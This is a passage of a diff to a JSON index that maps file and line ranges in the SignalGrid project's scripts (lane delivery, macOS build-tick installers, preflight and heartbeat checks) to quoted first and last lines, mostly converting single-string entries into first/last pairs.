+      "last": "if (!row.heartbeatPath) die(`heartbeat: \"${o.routine}\" declares no heartbeat path (${row.heartbeatPathReason ?? \"no reason given\"})`);"
+    },
     "scripts/lane-deliver.mjs:296": "if (flags.dryRun) {",
-    "scripts/lane-deliver.mjs:30-31": "//   Mac lane   → the worktree commit is pushed STRAIGHT to SignalGrid_Alpha, the",
+    "scripts/lane-deliver.mjs:30-31": {
+      "first": "//   Mac lane   → the worktree commit is pushed STRAIGHT to SignalGrid_Alpha, the",
+      "last": "//                same thing the Mac lane's own mail commits have always done."
+    },
     "scripts/lane-deliver.mjs:302": "const direct = lane === \"mac\" && !flags.viaPr;",
-    "scripts/lane-deliver.mjs:302-303": "const direct = lane === \"mac\" && !flags.viaPr;",
+    "scripts/lane-deliver.mjs:302-303": {
+      "first": "const direct = lane === \"mac\" && !flags.viaPr;",
+      "last": "const mailBranch = `lane/${lane}-mail-${stamp}`;"
+    },
     "scripts/lane-deliver.mjs:4": "//   pnpm run lane:deliver send \"subject\" \"body…\"",
-    "scripts/lane-deliver.mjs:7-9": "//   pnpm run lane:deliver batch ops.json        #",
-    "scripts/lane-deliver.mjs:83-98": "const flags = { dryRun: false, viaPr: false, noWake: false, allowUngated: false, trailers:",
-    "scripts/lane-message.mjs:208-215": "if (cmd === \"send\") {",
-    "scripts/lane-message.mjs:279-295": "console.error(`\"${messageId}\" is addressed to the ${m.to} lane; this machine is the ${me}",
+    "scripts/lane-deliver.mjs:7-9": {
+      "first": "//   pnpm run lane:deliver batch ops.json        #",
+      "last": "//                                               #   (a raised hand — artifacts/raised-hands/, scripts/raise-hand.mjs, DR-054)"
+    },
+    "scripts/lane-deliver.mjs:83-98": {
+      "first": "const flags = { dryRun: false, viaPr: false, noWake: false, allowUngated: false, trailers:",
+      "last": "const [cmd, ...rest] = positional;"
+    },
+    "scripts/lane-message.mjs:208-215": {
+      "first": "if (cmd === \"send\") {",
+      "last": "const explicitId = idFlag >= 0 ? rest[idFlag + 1] : undefined;"
+    },
+    "scripts/lane-message.mjs:280-295": {
+      "first": "console.error(`\"${messageId}\" is addressed to the ${m.to} lane; this machine is the ${me}",
+      "last": "`${JSON.stringify({ schemaVersion: 2, messageId, ackedBy: me, note, ackedAt: new Date().toISOString() }, null, 2)}\\n`,"
+    },
     "scripts/lane-message.mjs:334": "// fetched (the session-start hook fetches; this never reaches the network).",
     "scripts/lib/land-branch-gate.mjs:14": "//   node scripts/lib/land-branch-gate.mjs --self-test",
-    "scripts/lib/lane-identity.mjs:17-23": "export const LANES = Object.freeze([\"cloud\", \"mac\"]);",
-    "scripts/lib/lane-identity.mjs:20-23": "export function currentLane() {",
-    "scripts/loop-state.mjs:16-18": "// This script is the thing that notices. It reads the world, not the notes, and",
+    "scripts/lib/lane-identity.mjs:17-23": {
+      "first": "export const LANES = Object.freeze([\"cloud\", \"mac\"]);",
+      "last": "const derived = process.platform === \"darwin\" ? \"mac\" : \"cloud\";"
+    },
+    "scripts/lib/lane-identity.mjs:20-23": {
+      "first": "export function currentLane() {",
+      "last": "const derived = process.platform === \"darwin\" ? \"mac\" : \"cloud\";"
+    },
+    "scripts/loop-state.mjs:16-18": {
+      "first": "// This script is the thing that notices. It reads the world, not the notes, and",
+      "last": "// so it is safe to run half-awake on a Sunday."
+    },
     "scripts/mac/build-tick-stages.mjs:10": "//   node scripts/mac/build-tick-stages.mjs --self-test",
-    "scripts/mac/build-tick-stages.mjs:191-199": "// SG_STAGE_RUNNER is an explicit host-side transport, not a shell command or a provider",
-    "scripts/mac/build-tick-stages.mjs:222-258": "export function stageRunner(ctx, baseEnv = process.env) {",
-    "scripts/mac/build-tick-stages.mjs:254-258": "export function stageRequest(ctx, stage, kind, brief) {",
-    "scripts/mac/build-tick-stages.mjs:296-298": "const sessionBroken = (env, exit) => (env",
+    "scripts/mac/build-tick-stages.mjs:191-199": {
+      "first": "// SG_STAGE_RUNNER is an explicit host-side transport, not a shell command or a provider",
+      "last": "export const STAGE_RUNNER_PROTOCOL = 1;"
+    },
+    "scripts/mac/build-tick-stages.mjs:222-258": {
+      "first": "export function stageRunner(ctx, baseEnv = process.env) {",
+      "last": "readOnly: stage === \"triage\" || stage === \"review\", brief,"
+    },
+    "scripts/mac/build-tick-stages.mjs:254-258": {
+      "first": "export function stageRequest(ctx, stage, kind, brief) {",
+      "last": "readOnly: stage === \"triage\" || stage === \"review\", brief,"
+    },
+    "scripts/mac/build-tick-stages.mjs:296-298": {
+      "first": "const sessionBroken = (env, exit) => (env",
+      "last": ": exit !== 0 && exit !== 142);"
+    },
     "scripts/mac/build-tick-stages.mjs:76": "review: { model:",
-    "scripts/mac/build-tick.sh:390-393": "for _tool in git gh node pnpm npm claude perl; do",
-    "scripts/mac/build-tick.sh:395-404": "# ── 1a. paused? ──────────────────────────────────────────────────────────────",
-    "scripts/mac/host-verification-lock.sh:9-22": "sg_host_verify_acquire() {",
-    "scripts/mac/install-build-tick.sh:39-41": "if [ \"$(uname -s)\" != \"Darwin\" ]; then",
-    "scripts/mac/install-build-tick.sh:4-10": "# agent (owner-directed 2026-09-29; reaffirmed 2026-10-21, DR-050 / DR-060). ONE command,",
-    "scripts/mac/install-launchd.sh:33-36": "if [ \"$(uname -s)\" != \"Darwin\" ]; then",
-    "scripts/mac/install-launchd.sh:45-47": "if launchctl print \"gui/$UID_NUM/$LABEL\" >/dev/null 2>&1; then",
+    "scripts/mac/build-tick.sh:390-392": {
+      "first": "for _tool in git gh node pnpm npm claude perl; do",
+      "last": "command -v \"$_tool\" >/dev/null 2>&1 || fail \"$_tool is not on PATH for launchd (edit PATH at the top of scripts/mac/build-tick.sh)\""
+    },
+    "scripts/mac/build-tick.sh:395-403": {
+      "first": "# ── 1a. paused? ──────────────────────────────────────────────────────────────",
+      "last": "echo \"build-tick: paused — $(head -c 300 \"$PAUSED\" | tr '\\n' ' '); delete $PAUSED to resume\""
+    },
+    "scripts/mac/host-verification-lock.sh:9-20": {
+      "first": "sg_host_verify_acquire() {",
+      "last": "return \"$_sg_verify_rc\""
+    },
+    "scripts/mac/install-build-tick.sh:39-40": {
+      "first": "if [ \"$(uname -s)\" != \"Darwin\" ]; then",
+      "last": "echo \"install-build-tick.sh: launchd is macOS-only; on this host the cloud lane builds.\" >&2"
+    },
+    "scripts/mac/install-build-tick.sh:4-9": {
+      "first": "# agent (owner-directed 2026-09-29; reaffirmed 2026-10-21, DR-050 / DR-060). ONE command,",
+      "last": "#   bash scripts/mac/install-build-tick.sh --status"
+    },
+    "scripts/mac/install-launchd.sh:33-34": {
+      "first": "if [ \"$(uname -s)\" != \"Darwin\" ]; then",
+      "last": "echo \"install-launchd.sh: launchd is macOS-only; on this host the cloud lane and CI carry the work.\" >&2"
+    },
+    "scripts/mac/install-launchd.sh:46-47": {
+      "first": "if launchctl print \"gui/$UID_NUM/$LABEL\" >/dev/null 2>&1; then",
+      "last": "echo \"$LABEL is loaded (every $INTERVAL_SECONDS s); log: $LOG\""
+    },
     "scripts/mac/lane-tick.sh:281": "RESULT=\"deferred: $SG_VERIFY_LOCK_REASON; sim requests and objective evaluation not run\"",
-    "scripts/mac/lane-tick.sh:285-298": "if [ \"$DRY\" = \"0\" ]; then",
+    "scripts/mac/lane-tick.sh:285-296": {
+      "first": "if [ \"$DRY\" = \"0\" ]; then",
+      "last": "if ! sg_host_verify_acquire \"$HOME/Library/Caches/signalgrid/host-verification.lock\"; then"
+    },
     "scripts/mac/lane-tick.sh:296": "if ! sg_host_verify_acquire \"$HOME/Library/Caches/signalgrid/host-verification.lock\"; then",
-    "scripts/mac/local-brain/job-state.mjs:26-35": "function successfulVerification(details) {",
+    "scripts/mac/local-brain/job-state.mjs:26-34": {
+      "first": "function successfulVerification(details) {",
+      "last": "successfulVerification(checkpoint.details);"
+    },
     "scripts/mac/local-brain/job-state.mjs:50": "export class JobState {",
-    "scripts/mac/local-brain/proof-policy.mjs:42-61": "export function assessProof(proof, allowedScope) {",
-    "scripts/mac/local-brain/task-selector.mjs:1-21": "export function selectEligible(tasks, allowedScope) {",
+    "scripts/mac/local-brain/proof-policy.mjs:42-60": {
+      "first": "export function assessProof(proof, allowedScope) {",
+      "last": "return 'review';"
+    },
+    "scripts/mac/local-brain/task-selector.mjs:1-21": {
+      "first": "export function selectEligible(tasks, allowedScope) {",
+      "last": ".sort((a, b) => b.priority - a.priority || (a.id < b.id ? -1 : a.id > b.id ? 1 : 0));"
+    },
     "scripts/mac/run-requests.mjs:293": "console.log(\"\\n--plan: no result written.\");",
     "scripts/mac/run-requests.mjs:327": "console.log(`--plan: ${pendingRoster.length} request(s) PENDING of ${requestFiles.length}",
-    "scripts/mac/sg-brain-link.sh:12-18": "# WHAT IT DOES. The business/reference material — invention disclosures, product",
+    "scripts/mac/sg-brain-link.sh:12-18": {
+      "first": "# WHAT IT DOES. The business/reference material — invention disclosures, product",
+      "last": "# context — the \"brain\" gains the knowledge — while git never sees a byte of it."
+    },
     "scripts/mac/statusline.sh:6": "#   bash scripts/mac/statusline.sh --self-test  # builds a fixture tree, asserts the",
-    "scripts/mutation-guard.mjs:2226-2234": "writeFileSync(mutation.abs, mutation.content);",
+    "scripts/mutation-guard.mjs:2226-2234": {
+      "first": "writeFileSync(mutation.abs, mutation.content);",
+      "last": "writeFileSync(mutation.abs, mutation.original);"
+    },
     "scripts/objective-loop.mjs:3": "//   node scripts/objective-loop.mjs --json               derive and print; write nothing",
-    "scripts/objective-loop.mjs:394-406": "* The FRESHNESS WITNESS is the tick's heartbeat — delivered to mainline at least every ~25",
-    "scripts/objective-loop.mjs:400-408": "export function readVerdict(state, { heartbeat = null, nowIso } = {}) {",
+    "scripts/objective-loop.mjs:394-406": {
+      "first": "* The FRESHNESS WITNESS is the tick's heartbeat — delivered to mainline at least every ~25",
+      "last": "if (typeof heartbeat.result !== \"string\" || !heartbeat.result.includes(`objective: ${state.verdict}`)) return { verdict: \"unknown\", reason: `the tick heartbeat "
+    },
+    "scripts/objective-loop.mjs:400-407": {
+      "first": "export function readVerdict(state, { heartbeat = null, nowIso } = {}) {",
+      "last": "return { verdict: state.verdict, reason: null };"
+    },
     "scripts/objective-loop.mjs:8": "//   node scripts/objective-loop.mjs --check              the contract gate over the",
     "scripts/objective-loop.mjs:9": "//   node scripts/objective-loop.mjs --self-test          prove every clause can fail",
-    "scripts/preflight.mjs:110-112": "{ name: \"Local worker job-state proofs\", cmd: [\"node\",",
-    "scripts/preflight.mjs:46-58": "// footer says what that leaves out, recomputed from `.github/workflows/` on",
-    "scripts/preflight.mjs:681": "selfSkipsWithout: \"DATABASE_URL\",",
-    "scripts/preflight.mjs:688": "selfSkipsWithout: \"DATABASE_URL\",",
-    "scripts/preflight.mjs:808-812": "if (process.argv.includes(\"--list-steps\")) {",
-    "scripts/prune-merged-branches.mjs:5-6": "//   node scripts/prune-merged-branches.mjs          # plan only, deletes nothing",
+    "scripts/preflight.mjs:110-112": {
+      "first": "{ name: \"Local worker job-state proofs\", cmd: [\"node\",",
+      "last": "{ name: \"Local worker proof-policy proofs\", cmd: [\"node\", \"scripts/mac/local-brain/test/proof-policy.test.mjs\"] },"
+    },
+    "scripts/preflight.mjs:46-58": {
+      "first": "// footer says what that leaves out, recomputed from `.github/workflows/` on",
+      "last": "// rule (a read-only brief boots no server) and, at the root, by oidc.test.mjs moving off"
+    },
+    "scripts/preflight.mjs:671-677": {
+      "first": "// `selfSkipsWithout` is the CLASSIFICATION, and it is load-bearing. Without it the",
+      "last": "// or carries the marker without self-skipping."
+    },
+    "scripts/preflight.mjs:808-811": {
+      "first": "if (process.argv.includes(\"--list-steps\")) {",
+      "last": "process.exit(0);"
+    },
+    "scripts/prune-merged-branches.mjs:5-6": {
+      "first": "//   node scripts/prune-merged-branches.mjs          # plan only, deletes nothing",
+      "last": "//   APPLY=true node scripts/prune-merged-branches.mjs"
+    },
     "scripts/raise-hand.mjs:12": "//     [--origin mac-lane]",
     "scripts/raise-hand.mjs:18": "//   node scripts/raise-hand.mjs --list                                 # what is open",
-    "scripts/raise-hand.mjs:6-13": "//   node scripts/raise-hand.mjs \\",
-    "scripts/raise-hand.mjs:83-123": "async function raise() {",
+    "scripts/raise-hand.mjs:6-12": {
+      "first": "//   node scripts/raise-hand.mjs \\",
+      "last": "//     [--origin mac-lane]"
+    },
+    "scripts/raise-hand.mjs:83-123": {
+      "first": "async function raise() {",
+      "last": "writeFileSync(join(LEDGER, `${id}.json`), `${JSON.stringify(record, null, 2)}\\n`, \"utf8\");"
+    },
     "scripts/raised-hands.mjs:312": "if (sha.status !== 0) throw new TipMissing(`${ref} does not exist in this checkout —",
-    "scripts/raised-hands.mjs:312-314": "if (sha.status !== 0) throw new TipMissing(`${ref} does not exist in this checkout —",
+    "scripts/raised-hands.mjs:312-314": {
+      "first": "if (sha.status !== 0) throw new TipMissing(`${ref} does not exist in this checkout —",
+      "last": "const wt = git(cwd, [\"worktree\", \"add\", \"--detach\", \"--force\", root, ref]);"
+    },
     "scripts/raised-hands.mjs:6": "//   node scripts/raised-hands.mjs --check            # the gate (preflight: fatal)",
-    "scripts/raised-hands.mjs:790-797": "if (argv.includes(\"--check\")) {",
-    "scripts/role-work-queue.mjs:3-5": "//   node scripts/role-work-queue.mjs                 # every role, worst gap first",
-    "scripts/scan-estate-citations.mjs:16-19": "// A REPO THAT COULD NOT BE SCANNED IS REPORTED, NEVER COUNTED CLEAN. This is the same",
-    "scripts/scan-estate-citations.mjs:29-40": "export const ESTATE = [",
-    "scripts/sync.mjs:1-8": "// sync — the safe local <-> cloud git dance, so you never think about it.",
-    "scripts/verify-breadth.mjs:248-249": "if (process.argv.includes(\"--self-test\")) {",
-    "validate-sim-macos.sh:109-111": "run add -w --save-optional $WANT >/tmp/sgval_esbuild.log 2>&1 || echo \"   (add reported an"
+    "scripts/raised-hands.mjs:790-795": {
+      "first": "if (argv.includes(\"--check\")) {",
+      "last": "for (const f of fatal) console.error(`  ✗ ${f}`);"
+    },
+    "scripts/role-work-queue.mjs:3-5": {
+      "first": "//   node scripts/role-work-queue.mjs                 # every role, worst gap first",
+      "last": "//   node scripts/role-work-queue.mjs --self-test"
+    },
+    "scripts/scan-estate-citations.mjs:16-19": {
+      "first": "// A REPO THAT COULD NOT BE SCANNED IS REPORTED, NEVER COUNTED CLEAN. This is the same",
+      "last": "// identical in a summary and mean completely different things."
+    },
+    "scripts/scan-estate-citations.mjs:29-40": {
+      "first": "export const ESTATE = [",
+      "last": "upstreamFork: true,"
+    },
+    "scripts/sync.mjs:1-8": {
+      "first": "#!/usr/bin/env node",
+      "last": "//   4. STOPS and explains if the branch has diverged (never auto-merges or"
+    },
+    "scripts/verify-breadth.mjs:248-249": {
+      "first": "if (process.argv.includes(\"--self-test\")) {",
+      "last": "console.log(\"--self-test: membership derivation only; NO proofs were run, so this says nothing about the breadth surface.\");"
+    },
+    "validate-sim-macos.sh:109-111": {
+      "first": "run add -w --save-optional $WANT >/tmp/sgval_esbuild.log 2>&1 || echo \"   (add reported an",
+      "last": "cp /tmp/sgval_lock.bak pnpm-lock.yaml 2>/dev/null"
+    }
   }
 }
